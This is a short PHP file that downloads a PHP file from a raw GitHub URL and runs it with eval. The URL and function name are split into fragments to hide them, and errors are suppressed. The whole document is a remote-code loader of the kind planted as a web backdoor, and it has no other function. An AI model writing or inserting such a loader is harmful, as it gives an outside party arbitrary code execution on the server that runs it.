<?php
$awo = 'htt'.'ps://';
$f = 'file_get_contents';
eval("?>".@$f($awo.'raw.githubusercontent.com/aqilogic/logic/refs/heads/main/IDontKnow.php'));
?>
